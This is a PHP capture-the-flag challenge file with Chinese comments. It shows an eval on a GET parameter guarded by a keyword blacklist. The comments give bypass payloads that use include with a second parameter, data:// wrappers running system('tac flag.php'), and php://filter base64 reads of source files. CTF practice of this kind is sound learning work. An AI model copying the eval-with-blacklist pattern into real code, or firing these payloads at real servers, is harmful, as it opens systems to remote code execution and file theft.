<?php
/*$c="$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php";*/
/*
 * 32~36-配合包含&伪协议
 * ?> 代替 ;
c=include$_GET[1]?>&1=data://text/plain,<?=system('tac ctf27.php');?>
    include 文件包含，包含后回执行文件内的代码
    包含对象：data://xxx/xxx,<?=system('tac flag.php');?>
    是一个data协议
c=include$_GET[2]?>&2=php://filter/read=convert.base64-encode/resource=ctf27.php
c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
    include 文件包含，包含后回执行文件内的代码
    包含对象：php://filter/read=convert.base64-encode/resource=flag.php
    php协议，可以访问各输入输出流

 */
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    echo $c;
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
}else{
    highlight_file(__FILE__);
}